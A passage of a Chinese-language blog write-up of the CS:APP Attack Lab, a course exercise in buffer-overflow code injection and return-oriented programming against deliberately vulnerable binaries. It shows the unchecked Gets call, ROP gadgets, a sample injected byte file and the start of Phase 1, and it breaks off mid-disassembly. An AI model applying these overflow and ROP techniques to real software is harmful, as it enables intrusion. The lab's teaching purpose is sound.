<!DOCTYPE html><html class=bg-base-300 data-theme=winter data-theme-type=light lang=en><head><meta content=true name=astro-view-transitions-enabled><meta content=animate name=astro-view-transitions-fallback><script type=module src=/_astro/ClientRouter.astro_astro_type_script_index_0_lang.waUwC-PJ.js></script><script src=/_astro/vanilla.ChgcMPTJ.js data-astro-rerun></script><script type=module src=/_astro/PointerOnNavigation.astro_astro_type_script_index_0_lang.Dwfd1XXs.js></script><meta charset=utf-8><meta content="width=device-width,initial-scale=1" name=viewport><link href=/favicon.svg rel=icon type=image><meta content="Astro v5.13.7" name=generator><meta content="Attacklab records" name=description><meta content=Attacklab property=og:title><meta content="Attacklab records" property=og:description><meta content=https://tankimzeg.top/og/csapp/attacklab.png property=og:image><link href=https://tankimzeg.top/blog/csapp/attacklab/ rel=canonical><title>Attacklab - TanKimzeg</title><script>!function(){const e="winter",t="dracula";!function(){const a=localStorage.getItem("theme"),m=window.matchMedia("(prefers-color-scheme: dark)").matches;let c;a?c=a:(c=m?t:e,localStorage.setItem("theme",c)),document.documentElement.setAttribute("data-theme",c);const o=c===t?"dark":"light";document.documentElement.setAttribute("data-theme-type",o),window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",(a=>{if(!localStorage.getItem("theme")){const m=a.matches?t:e;document.documentElement.setAttribute("data-theme",m);const c=a.matches?"dark":"light";document.documentElement.setAttribute("data-theme-type",c),localStorage.setItem("theme",m)}}))}()}()</script><link href=/_astro/about.BB1pbI9A.css rel=stylesheet><style>.modal-backdrop[data-astro-cid-zux26muy] button[data-astro-cid-zux26muy]{cursor:default;width:100%;height:100%;opacity:0}.card-body .btn-category,.card-body .btn-tag{text-decoration:none}</style></head><body class="flex flex-col min-h-screen" data-pagefind-body=true><nav class="w-full bg-base-100 shadow-lg ease-in-out transform transition-transform delay-300 duration-500 fixed md:hidden navbar px-2 text-center z-50" id=navbar><div class=navbar-start><label class="btn btn-circle bg-base-100 btn-md swap swap-rotate"><span class=sr-only>Toggle menu</span> <input type=checkbox id=menu-toggle> <svg height=1em width=1em data-icon=lucide:menu class="h-5 w-5 swap-off"><symbol id=ai:lucide:menu viewBox="0 0 24 24"><path d="M4 5h16M4 12h16M4 19h16" fill=none stroke=currentColor stroke-linecap=round stroke-linejoin=round stroke-width=2 /></symbol><use href=#ai:lucide:menu></use></svg> <svg height=1em width=1em data-icon=lucide:x class="h-5 w-5 swap-on"><symbol id=ai:lucide:x viewBox="0 0 24 24"><path d="M18 6L6 18M6 6l12 12" fill=none stroke=currentColor stroke-linecap=round stroke-linejoin=round stroke-width=2 /></symbol><use href=#ai:lucide:x></use></svg></label></div><div class=navbar-center><a href=/ class="btn btn-ghost hover:scale-105 transition-transform duration-300 text-xl">TanKimzeg&#39;s Blog</a></div><div class=navbar-end><button title="Theme Toggle" aria-label="Toggle theme" class="btn btn-circle hover:scale-110 bg-base-100 btn-md shadow-sm md:border-base-content/20 navbar-theme" data-astro-cid-mjqc4hpp data-theme-toggle id=theme-toggle-kf1pxwxy6><svg height=1em width=1em data-icon=lucide:sun class="h-5 w-5 theme-toggle-icon sun-icon" data-astro-cid-mjqc4hpp=true><symbol id=ai:lucide:sun viewBox="0 0 24 24"><g fill=none stroke=currentColor stroke-linecap=round stroke-linejoin=round stroke-width=2><circle cx=12 cy=12 r=4 /><path d="M12 2v2m0 16v2M4.93 4.93l1.41 1.41m11.32 11.32l1.41 1.41M2 12h2m16 0h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></g></symbol><use href=#ai:lucide:sun></use></svg> <svg height=1em width=1em data-icon=lucide:moon class="h-5 w-5 theme-toggle-icon hidden moon-icon" data-astro-cid-mjqc4hpp=true><symbol id=ai:lucide:moon viewBox="0 0 24 24"><path d="M20.985 12.486a9 9 0 1 1-9.473-9.472c.405-.022.617.46.402.803a6 6 0 0 0 8.268 8.268c.344-.215.825-.004.803.401" fill=none stroke=currentColor stroke-linecap=round stroke-linejoin=round stroke-width=2 /></symbol><use href=#ai:lucide:moon></use></svg></button><script>!function(){const e="winter",t="dracula",n=(e,t)=>{if(!e)return;const n=e.querySelector(".sun-icon"),d=e.querySelector(".moon-icon");n&&d&&(t?(n.classList.remove("hidden"),d.classList.add("hidden")):(n.classList.add("hidden"),d.classList.remove("hidden")))};document.addEventListener("astro:page-load",(()=>{const d=document.getElementById("theme-toggle-kf1pxwxy6");if(!d)return;const o=document.documentElement.getAttribute("data-theme");n(d,o===t),d.addEventListener("click",(()=>{const o=document.documentElement.getAttribute("data-theme")===e?t:e;d.classList.add("animate-spin-once"),document.documentElement.setAttribute("data-theme",o);const c=o===t?"dark":"light";document.documentElement.setAttribute("data-theme-type",c),localStorage.setItem("theme",o);document.querySelectorAll("[data-theme-toggle]").forEach((e=>{n(e,o===t)})),setTimeout((()=>{d.classList.remove("animate-spin-once")}),300)}))}))}()</script></div><div class="w-full bg-base-100 shadow-lg ease-in-out transform transition-transform -translate-x-full absolute duration-300 left-0 top-full" id=header-menu><ul class="w-full bg-transparent menu p-2"><li class="relative w-full group"><a href=/ class="flex items-center rounded-lg hover:bg-base-200 font-bold p-3 text-lg" target=_self><svg height=1em width=1em data-icon=material-symbols:home-outline-rounded class="h-5 w-5 mr-2"><symbol id=ai:material-symbols:home-outline-rounded viewBox="0 0 24 24"><path d="M6 19h3v-5q0-.425.288-.712T10 13h4q.425 0 .713.288T15 14v5h3v-9l-6-4.5L6 10zm-2 0v-9q0-.475.213-.9t.587-.7l6-4.5q.525-.4 1.2-.4t1.2.4l6 4.5q.375.275.588.7T20 10v9q0 .825-.588 1.413T18 21h-4q-.425 0-.712-.288T13 20v-5h-2v5q0 .425-.288.713T10 21H6q-.825 0-1.412-.587T4 19m8-6.75" fill=currentColor /></symbol><use href=#ai:material-symbols:home-outline-rounded></use></svg> <span>Home</span></a></li><li class="relative w-full group"><a href=/about class="flex items-center rounded-lg hover:bg-base-200 font-bold p-3 text-lg" target=_self><svg height=1em width=1em data-icon=material-symbols:info-outline-rounded class="h-5 w-5 mr-2"><symbol id=ai:material-symbols:info-outline-rounded viewBox="0 0 24 24"><path d="M12 17q.425 0 .713-.288T13 16v-4q0-.425-.288-.712T12 11t-.712.288T11 12v4q0 .425.288.713T12 17m0-8q.425 0 .713-.288T13 8t-.288-.712T12 7t-.712.288T11 8t.288.713T12 9m0 13q-2.075 0-3.9-.788t-3.175-2.137T2.788 15.9T2 12t.788-3.9t2.137-3.175T8.1 2.788T12 2t3.9.788t3.175 2.137T21.213 8.1T22 12t-.788 3.9t-2.137 3.175t-3.175 2.138T12 22m0-2q3.35 0 5.675-2.325T20 12t-2.325-5.675T12 4T6.325 6.325T4 12t2.325 5.675T12 20m0-8" fill=currentColor /></symbol><use href=#ai:material-symbols:info-outline-rounded></use></svg> <span>About</span></a></li><li class="relative w-full group"><details open><summary class="flex items-center rounded-lg hover:bg-base-200 font-bold p-3 text-lg"><svg height=1em width=1em data-icon=material-symbols:book-2-outline-rounded class="h-5 w-5 mr-2"><symbol id=ai:material-symbols:book-2-outline-rounded viewBox="0 0 24 24"><path d="M6 15.325q.35-.175.725-.25T7.5 15H8V4h-.5q-.625 0-1.062.438T6 5.5zM10 15h8V4h-8zm-4 .325V4zM7.5 22q-1.45 0-2.475-1.025T4 18.5v-13q0-1.45 1.025-2.475T7.5 2H18q.825 0 1.413.587T20 4v12.525q0 .2-.162.363t-.588.362q-.35.175-.55.5t-.2.75t.2.763t.55.487t.55.413t.2.562v.25q0 .425-.288.725T19 22zm0-2h9.325q-.15-.35-.237-.712T16.5 18.5q0-.4.075-.775t.25-.725H7.5q-.65 0-1.075.438T6 18.5q0 .65.425 1.075T7.5 20" fill=currentColor /></symbol><use href=#ai:material-symbols:book-2-outline-rounded></use></svg> <span>Blogs</span></summary><ul class=pl-4><li><a href=/blog class="flex items-center rounded-lg hover:bg-base-200 p-2" target=_self><svg height=1em width=1em data-icon=material-symbols:ink-pen-outline-rounded class="h-4 w-4 mr-2"><symbol id=ai:material-symbols:ink-pen-outline-rounded viewBox="0 0 24 24"><path d="m12.25 10.825l.925.925L18.6 6.325l-.925-.925zM5 19h.925l5.825-5.825l-.925-.925L5 18.075zm8.875-5.125l-3.75-3.75L14.3 5.95l-.725-.725L8.8 10q-.3.3-.7.3t-.7-.3t-.3-.712t.3-.713l4.75-4.75q.6-.6 1.413-.6t1.412.6l.725.725l1.25-1.25q.3-.3.713-.3t.712.3L20.7 5.625q.3.3.3.712t-.3.713zM4 21q-.425 0-.712-.288T3 20v-1.925q0-.4.15-.763t.425-.637l6.55-6.55l3.75 3.75l-6.55 6.55q-.275.275-.638.425t-.762.15z" fill=currentColor /></symbol><use href=#ai:material-symbols:ink-pen-outline-rounded></use></svg> <span>All blogs</span></a></li><li><a href=/blog/category/tech class="flex items-center rounded-lg hover:bg-base-200 p-2" target=_self><svg height=1em width=1em data-icon=material-symbols:deployed-code-outline class="h-4 w-4 mr-2"><symbol id=ai:material-symbols:deployed-code-outline viewBox="0 0 24 24"><path d="M11 19.425v-6.85L5 9.1v6.85zm2 0l6-3.475V9.1l-6 3.475zm-1-8.575l5.925-3.425L12 4L6.075 7.425zM4 17.7q-.475-.275-.737-.725t-.263-1v-7.95q0-.55.263-1T4 6.3l7-4.025Q11.475 2 12 2t1 .275L20 6.3q.475.275.738.725t.262 1v7.95q0 .55-.262 1T20 17.7l-7 4.025Q12.525 22 12 22t-1-.275zm8-5.7" fill=currentColor /></symbol><use href=#ai:material-symbols:deployed-code-outline></use></svg> <span>Tech Blogs</span></a></li><li><a href=/blog/category/life class="flex items-center rounded-lg hover:bg-base-200 p-2" target=_self><svg height=1em width=1em data-icon=material-symbols:earthquake-rounded class="h-4 w-4 mr-2"><symbol id=ai:material-symbols:earthquake-rounded viewBox="0 0 24 24"><path d="M9.025 22q-.35 0-.612-.187T8.05 21.3L5.5 13H3q-.425 0-.712-.288T2 12t.288-.712T3 11h3.25q.325 0 .588.188t.362.512l1.65 5.375L12.025 2.8q.075-.35.35-.575T13 2t.625.213t.35.562l2.175 9.4l1.4-4.475q.1-.325.362-.512T18.5 7t.575.175t.375.475L20.7 11h.3q.425 0 .713.288T22 12t-.288.713T21 13h-1q-.325 0-.575-.175t-.375-.475l-.475-1.275L16.95 16.3q-.1.325-.375.525T15.95 17t-.6-.238t-.325-.537L13 7.525l-3.025 13.7q-.075.35-.337.55T9.025 22" fill=currentColor /></symbol><use href=#ai:material-symbols:earthquake-rounded></use></svg> <span>Life Blogs</span></a></li></ul></details></li><li class="relative w-full group"><a href=/project class="flex items-center rounded-lg hover:bg-base-200 font-bold p-3 text-lg" target=_self><svg height=1em width=1em data-icon=material-symbols:code-blocks-outline class="h-5 w-5 mr-2"><symbol id=ai:material-symbols:code-blocks-outline viewBox="0 0 24 24"><path d="m9.6 15.6l1.4-1.425L8.825 12L11 9.825L9.6 8.4L6 12zm4.8 0L18 12l-3.6-3.6L13 9.825L15.175 12L13 14.175zM5 21q-.825 0-1.412-.587T3 19V5q0-.825.588-1.412T5 3h14q.825 0 1.413.588T21 5v14q0 .825-.587 1.413T19 21zm0-2h14V5H5zM5 5v14z" fill=currentColor /></symbol><use href=#ai:material-symbols:code-blocks-outline></use></svg> <span>Project</span></a></li><li class="relative w-full group"><a href=/friend class="flex items-center rounded-lg hover:bg-base-200 font-bold p-3 text-lg" target=_self><svg height=1em width=1em data-icon=material-symbols:supervisor-account-outline-rounded class="h-5 w-5 mr-2"><symbol id=ai:material-symbols:supervisor-account-outline-rounded viewBox="0 0 24 24"><path d="M17 15q-1.05 0-1.775-.725T14.5 12.5t.725-1.775T17 10t1.775.725t.725 1.775t-.725 1.775T17 15m-5 4v-.4q0-.6.313-1.112t.887-.738q.9-.375 1.863-.562T17 16t1.938.188t1.862.562q.575.225.888.738T22 18.6v.4q0 .425-.288.713T21 20h-8q-.425 0-.712-.288T12 19m-2-7q-1.65 0-2.825-1.175T6 8t1.175-2.825T10 4t2.825 1.175T14 8t-1.175 2.825T10 12m-8 5.2q0-.85.425-1.562T3.6 14.55q1.5-.75 3.113-1.15T10 13q.875 0 1.75.15t1.75.35l-.85.85l-.85.85q-.45-.125-.9-.162T10 15q-1.45 0-2.838.35t-2.662 1q-.25.125-.375.35T4 17.2v.8h6v.975q0 .325.125.588t.35.437H4q-.825 0-1.412-.587T2 18zm8-7.2q.825 0 1.413-.587T12 8t-.587-1.412T10 6t-1.412.588T8 8t.588 1.413T10 10" fill=currentColor /></symbol><use href=#ai:material-symbols:supervisor-account-outline-rounded></use></svg> <span>Friend</span></a></li></ul></div></nav><script type=module>document.addEventListener("astro:page-load",(()=>{let e=window.scrollY;const t=document.getElementById("navbar"),s=document.getElementById("header-menu"),a=document.getElementById("menu-toggle");if(!t||!s||!a)return;a.addEventListener("change",(()=>{a.checked?(s.classList.remove("-translate-x-full"),s.classList.add("translate-x-0")):(s.classList.add("-translate-x-full"),s.classList.remove("translate-x-0"))}));let l=!1;window.addEventListener("scroll",(()=>{l||(window.requestAnimationFrame((()=>{!t||!s||!a||(window.scrollY>e&&window.scrollY>50?(t.classList.add("-translate-y-full","duration-500"),t.classList.remove("translate-y-0"),a.checked&&(a.checked=!1,s.classList.add("-translate-x-full"),s.classList.remove("translate-x-0"))):window.scrollY<e&&(t.classList.remove("-translate-y-full"),t.classList.add("translate-y-0","duration-300")),e=window.scrollY),l=!1})),l=!0)})),document.addEventListener("click",(e=>{if(!t||!s||!a)return;const l=e.target;!t.contains(l)&&s.classList.contains("translate-x-0")&&(a.checked=!1,s.classList.add("-translate-x-full"),s.classList.remove("translate-x-0"))})),document.querySelectorAll("#header-menu a").forEach((e=>{e.addEventListener("click",(()=>{!s||!a||a.checked&&(a.checked=!1,s.classList.add("-translate-x-full"),s.classList.remove("translate-x-0"))}))}))}))</script><div class="w-full flex-grow max-w-6xl mx-auto"><div class="gap-4 grid lg:grid-cols-4 grid-cols-1 h-full md:grid-cols-5 p-4"><main class="flex flex-col gap-4 bg-transparent col-span-1 lg:col-span-3 md:col-span-4 md:mt-0 md:order-2 mt-16 order-1"><div class="flex flex-col gap-4 flex-grow"><div class="w-full bg-base-100 shadow-lg rounded-xl overflow-hidden"><div class="pt-6 px-6"><h1 class="text-xl font-bold lg:text-4xl sm:text-2xl">Attacklab</h1><p class="text-sm mt-2 text-base-content/80">Attacklab records</p></div><div class="sm:p-6 p-4"><div class="flex flex-col gap-y-2 mb-4 opacity-75 sm:flex-row sm:justify-between sm:text-sm text-xs"><div class="flex items-center flex-wrap gap-x-4 gap-y-2"><span class="flex items-center gap-1"><svg height=1em width=1em data-icon=lucide:calendar class="h-4 w-4 flex-shrink-0"><symbol id=ai:lucide:calendar viewBox="0 0 24 24"><g fill=none stroke=currentColor stroke-linecap=round stroke-linejoin=round stroke-width=2><path d="M8 2v4m8-4v4"/><rect height=18 rx=2 width=18 x=3 y=4 /><path d="M3 10h18"/></g></symbol><use href=#ai:lucide:calendar></use></svg> <span class=truncate>Fri Jan 24 2025</span></span></div><div class="flex items-center gap-1 flex-wrap"><svg height=1em width=1em data-icon=lucide:book-open class="h-4 w-4 flex-shrink-0"><symbol id=ai:lucide:book-open viewBox="0 0 24 24"><path d="M12 7v14m-9-3a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4a4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3a3 3 0 0 0-3-3z" fill=none stroke=currentColor stroke-linecap=round stroke-linejoin=round stroke-width=2 /></symbol><use href=#ai:lucide:book-open></use></svg> <span class=truncate>4055 words · 26 minutes</span></div></div><div class=mb-6><div class="flex items-center flex-wrap gap-2"><a href=/blog/category/tech class="btn btn-xs btn-category"><svg height=1em width=1em data-icon=lucide:folder class="h-4 w-4" viewBox="0 0 24 24"><use href=#ai:lucide:folder></use></svg> <span>tech</span> </a><a href=/blog/tag/csapp class="btn btn-xs btn-tag"><svg height=1em width=1em data-icon=lucide:tag class="h-4 w-4" viewBox="0 0 24 24"><use href=#ai:lucide:tag></use></svg> <span>csapp</span> </a><a href=/blog/tag/csapplab class="btn btn-xs btn-tag"><svg height=1em width=1em data-icon=lucide:tag class="h-4 w-4" viewBox="0 0 24 24"><use href=#ai:lucide:tag></use></svg> <span>csapplab</span></a></div></div><div class=mt-8><div class="max-w-none prose prose-headings:scroll-mt-20 prose-img:mx-auto prose-img:rounded-xl" id=content><h1 id=介绍>介绍</h1><ul><li>Phase 1~3: 利用栈溢出攻击</li><li>Phase 4~5: 利用ROP攻击 ctarget 和 rtarget都用getbuf函数读取输入:</li></ul><div class=expressive-code><link href=/_astro/ec.oj3b7.css rel=stylesheet><script type=module src=/_astro/ec.p1z7b.js></script><figure class=frame><figcaption class=header></figcaption><pre data-language=c><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#F97583>unsigned</span><span style=--0:#E1E4E8> </span><span style=--0:#B392F0>getbuf</span><span style=--0:#E1E4E8>(){</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span class=indent>  </span><span style=--0:#F97583>char</span><span style=--0:#E1E4E8> </span><span style=--0:#FFAB70>buf</span><span style=--0:#E1E4E8>[BUFFER_SIZE];</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span class=indent>  </span><span style=--0:#B392F0>Gets</span><span style=--0:#E1E4E8>(buf);</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span class=indent>  </span><span style=--0:#F97583>return</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>1</span><span style=--0:#E1E4E8>;</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code><span style=--0:#E1E4E8>}</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="unsigned getbuf(){  char buf[BUFFER_SIZE];  Gets(buf);  return 1;}" data-copied=Copied!><div></div></button></div></figure></div><p><code>Gets()</code>函数是和 <code>gets()</code>函数相似,不进行边界检查.这是溢出的利用点.</p><h2 id=rop举例>ROP举例</h2><p>目的:pop赋值0xBBBBBBBB给%rbx,然后复制给%rax gadgets:</p><ul><li>address1:</li></ul><div class=expressive-code><figure class=frame><figcaption class=header></figcaption><pre data-language=plaintext><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>mov    %rbx,%rax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>ret</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="  mov    %rbx,%rax  ret" data-copied=Copied!><div></div></button></div></figure></div><ul><li>address2:</li></ul><div class=expressive-code><figure class=frame><figcaption class=header></figcaption><pre data-language=plaintext><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>pop    %rbx</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>ret</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="  pop    %rbx  ret" data-copied=Copied!><div></div></button></div></figure></div><p><img decoding=async fetchpriority=auto height=829 loading=lazy src=/_astro/Pasted%20image%2020250124180130.Cq8m6ALh_ZdY36P.webp width=782></p><h1 id=工具>工具</h1><h2 id=objdump>objdump</h2><p>这一次,我需要用到objdump工具.这是是Linux下的反汇编目标文件或者可执行文件的命令. 使用</p><div class=expressive-code><figure class="frame is-terminal"><figcaption class=header><span class=title></span><span class=sr-only>Terminal window</span></figcaption><pre data-language=shell><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#B392F0>sudo</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>apt-get</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>update</span><span style=--0:#E1E4E8> &#x26;&#x26; </span><span style=--0:#B392F0>sudo</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>apt-get</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>install</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>binutils</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="sudo apt-get update &#x26;&#x26; sudo apt-get install binutils" data-copied=Copied!><div></div></button></div></figure></div><p>安装包含odjdump的工具</p><div class=expressive-code><figure class="frame is-terminal"><figcaption class=header><span class=title></span><span class=sr-only>Terminal window</span></figcaption><pre data-language=shell><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#B392F0>objdump</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>-d</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>example.o</span><span style=--0:#E1E4E8> </span><span style=--0:#F97583>></span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>example.d</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="objdump -d example.o > example.d" data-copied=Copied!><div></div></button></div></figure></div><p>将目标文件反汇编成指令</p><h2 id=hex2raw>hex2raw</h2><p>将十六进制数转换成字符串,例如</p><div class=expressive-code><figure class="frame has-title"><figcaption class=header><span class=title>exploit.txt</span></figcaption><pre data-language=plaintext><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#e1e4e8>48 c7 c1 f0 11 40 00       /* mov $0x40011f0,%rcx */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span style=--0:#e1e4e8>68 ef cd ab 00             /* pushq $0xabcdef */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span style=--0:#e1e4e8>48 83 c0 11                /* add $0x11,%rax */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span style=--0:#e1e4e8>89 c2                      /* mov %eax,%edx */</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="48 c7 c1 f0 11 40 00       /* mov $0x40011f0,%rcx */68 ef cd ab 00             /* pushq $0xabcdef */48 83 c0 11                /* add $0x11,%rax */89 c2                      /* mov %eax,%edx */" data-copied=Copied!><div></div></button></div></figure></div><p>可以用I/O重定向存储转换后的文件</p><div class=expressive-code><figure class="frame is-terminal"><figcaption class=header><span class=title></span><span class=sr-only>Terminal window</span></figcaption><pre data-language=shell><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#B392F0>./hex2raw</span><span style=--0:#E1E4E8> </span><span style=--0:#F97583>&#x3C;</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>explot.txt</span><span style=--0:#E1E4E8> </span><span style=--0:#F97583>></span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>exploit-raw.txt</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span style=--0:#B392F0>./ctarget</span><span style=--0:#E1E4E8> </span><span style=--0:#F97583>&#x3C;</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>exploit-raw.txt</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span style=--0:#B392F0>gdb</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>ctarget</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>gdb</span><span style=--0:#E1E4E8>) </span><span style=--0:#B392F0>r</span><span style=--0:#E1E4E8> </span><span style=--0:#F97583>&#x3C;</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>exploit-raw.txt</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="./hex2raw < explot.txt > exploit-raw.txt./ctarget < exploit-raw.txtgdb ctarget(gdb) r < exploit-raw.txt" data-copied=Copied!><div></div></button></div></figure></div><h2 id=gdb>GDB</h2><div class=expressive-code><figure class="frame is-terminal"><figcaption class=header><span class=title></span><span class=sr-only>Terminal window</span></figcaption><pre data-language=shell><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#B392F0>gcc</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>-c</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>example.s</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="gcc -c example.s" data-copied=Copied!><div></div></button></div></figure></div><p>产生汇编文件对应的目标文件. 当然,使用GDB的调试功能监视内存地址和寄存器也是必不可少的.我已经在Bomblab中掌握了.</p><h1 id=ctargetcode-injection-attacks>ctarget:Code Injection Attacks</h1><p><code>getbuf()</code>函数被 <code>test()</code>函数调用:</p><div class=expressive-code><figure class=frame><figcaption class=header></figcaption><pre data-language=c><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#F97583>void</span><span style=--0:#E1E4E8> </span><span style=--0:#B392F0>test</span><span style=--0:#E1E4E8>(){</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span class=indent>  </span><span style=--0:#F97583>int</span><span style=--0:#E1E4E8> val;</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span class=indent><span style=--0:#E1E4E8>  </span></span><span style=--0:#E1E4E8>val </span><span style=--0:#F97583>=</span><span style=--0:#E1E4E8> </span><span style=--0:#B392F0>getbuf</span><span style=--0:#E1E4E8>();</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span class=indent>  </span><span style=--0:#B392F0>printf</span><span style=--0:#E1E4E8>(</span><span style=--0:#9ECBFF>"No exploit.  Getbuf return 0x</span><span style=--0:#79B8FF>%x\n</span><span style=--0:#9ECBFF>"</span><span style=--0:#E1E4E8>, val);</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code><span style=--0:#E1E4E8>}</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="void test(){  int val;  val = getbuf();  printf(&#x22;No exploit.  Getbuf return 0x%x\n&#x22;, val);}" data-copied=Copied!><div></div></button></div></figure></div><h2 id=phase-1>Phase 1</h2><p>这个问题中,需要我修改返回地址,重定向到<code>touch1()</code>函数:</p><div class=expressive-code><figure class=frame><figcaption class=header></figcaption><pre data-language=c><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#F97583>void</span><span style=--0:#E1E4E8> </span><span style=--0:#B392F0>touch1</span><span style=--0:#E1E4E8>(){</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span class=indent><span style=--0:#E1E4E8>  </span></span><span style=--0:#E1E4E8>vlevel </span><span style=--0:#F97583>=</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>1</span><span style=--0:#E1E4E8>;</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span class=indent>  </span><span style=--0:#B392F0>printf</span><span style=--0:#E1E4E8>(</span><span style=--0:#9ECBFF>"Touch1!: You called touch1()</span><span style=--0:#79B8FF>\n</span><span style=--0:#9ECBFF>"</span><span style=--0:#E1E4E8>);</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span class=indent>  </span><span style=--0:#B392F0>validate</span><span style=--0:#E1E4E8>(</span><span style=--0:#79B8FF>1</span><span style=--0:#E1E4E8>);</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code><span class=indent>  </span><span style=--0:#B392F0>exit</span><span style=--0:#E1E4E8>(</span><span style=--0:#79B8FF>0</span><span style=--0:#E1E4E8>);</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>6</div></div><div class=code><span style=--0:#E1E4E8>}</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="void touch1(){  vlevel = 1;  printf(&#x22;Touch1!: You called touch1()\n&#x22;);  validate(1);  exit(0);}" data-copied=Copied!><div></div></button></div></figure></div><p>首先,我反汇编 <code>getbuf()</code>函数:</p><div class=expressive-code><figure class=frame><figcaption class=header></figcaption><pre data-language=plaintext><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#e1e4e8>(gdb) disass getbuf</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span style=--0:#e1e4e8>Dump of assembler code for function getbuf:</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>   </span></span><span style=--0:#e1e4e8>0x00000000004017a8 &#x3C;+0>:     sub    $0x28,%rsp</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>   </span></span><span style=--0:#e1e4e8>0x00000000004017ac &#x3C;+4>:     mov    %rsp,%rdi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>   </span></span><span style=--0:#e1e4e8>0x00000000004017af &#x3C;+7>:     call   0x401a40 &#x3C;Gets></span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>6</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>   </span></span><span style=--0:#e1e4e8>0x00000000004017b4 